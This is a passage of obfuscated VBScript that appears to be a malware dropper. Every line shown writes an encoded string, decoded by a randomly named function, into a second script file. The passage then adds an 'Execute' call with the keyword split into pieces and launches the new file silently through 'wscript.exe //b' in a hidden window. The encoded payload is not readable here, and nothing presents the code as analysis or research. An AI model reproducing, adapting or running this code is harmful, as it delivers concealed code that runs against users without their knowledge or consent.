uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""56:52:28:58:29:49:6:21:34:40:95:5:8:40:25:103:79:54:15:44:111:91:103:47:59:28:59:40:6:17:62:36:31:84:109:49:38:1:2:47""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""56:52:28:58:29:49:6:21:34:40:95:57:29:35:19""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:62:57:9:6:32:14:38:19:47:61:99:36:51:12:5:63:11:109:74:103:95:65:122:88:25:31:34:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""31:48:26:4:63:86:2:7:34:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""31:48:26:4:63:86:25:14:55:8:81:119:88:124""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""31:48:26:4:63:86:26:5:46:25:20:98:55:62:6:12:58:56:1:26:40:50:105:63:20:57:8:34:25:52:8:51:37:28:52:94""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:21:62:15:40:62:105:43:24:38:29:40:15:46:30:5:57:80:44:48:41:36:5:99:88:25:31:34:3:81:46:12:58:18:14:67:53:47:20:40:3:34:43:24:38:29:109:22:0:3:56:62""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""31:48:26:4:63:86:30:22:49:8:37:37:62:36:27:34:77:16:13:22:4:3""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""31:48:26:4:63:86:14:27:40:30:20""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""32:20:14:3:35:8:57:89:20:1:20:47:8:109:70:118:94:66:125""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""18:53:31:35:47:11:56:27:51:77:76:106:61:35:20:40:9:20:98:25:10:25:14:25:88""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""4:34:25:81:5:62:36:27:34:77:76:106:28:57:0:34:36:95:5:8:40:25:19:8:9:62:62:36:27:34:69:59:32:16:58:46:12:23:9:45:54:97:69:107:25:3:63:29:100""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""56:1:4:29:47:86:26:5:46:25:20:98:29:63:5:21:8:2:63:20:57:94""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""56:1:4:29:47:86:14:27:40:30:20""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""32:20:14:3:35:8:57:89:20:1:20:47:8:109:67:117:94:71""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:21:62:15:40:62:105:43:24:38:29:40:15:46:30:5:57:80:44:48:41:36:5:99:88:25:31:34:3:81:46:12:58:18:14:67:53:47:20:40:3:34:43:24:38:29:109:22:0:3:56:62""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""62:33:77:21:62:15:40:62:105:43:24:38:29:40:15:46:30:5:57:80:7:29:47:26:40:1:2:53:16:9:68:81:11:22:41:87:35:25:6:47:49:99:48:34:25:55:35:20:40:95:13:7:25:61:33:6:13:63:10:63:99:86:62:30:61:8:81:116:88:124:65:115:85:68:106:57:3:51:103:32:24:46:80:40:5:53:63:20:57:13:33:3:107:92:93:120:81:112:85:10:55:83:106:44:37:18:41:77""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""16:43:0:48:47:88:112:87:36:37:59:16:40:38:15:6:14:50:100:10:56:25:103:69:59:32:16:58:46:12:23:9:45:54:97:67:107:25:3:63:29:100""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:35:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""50:41:9:81:35:30""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "UZptMiKwqSx=UZptMiKwqSx+(DoZrIHgSuIb(""59:40:2:1:106:47:37:30:43:8:81:12:14:59:61:2:26:21:33:40:27:87:121:77:65""))& vbCrLf" & vbCrLf
uBTZUpQmXdk.Write "Ex" + "" + "ec" + "ut" + "e" + " (" + "UZptMiKwqSx" + ")"
uBTZUpQmXdk.Close
uGEWOpEJApj = IDgoiCGfJEN.Run("ws" + "" + "cr" + "ip" + "" + "t" + "." + "" + "ex" + "e " + "/" + "/" + "" + "b " + """" + IDMBgCUmJCI + """", 4, False)
End Sub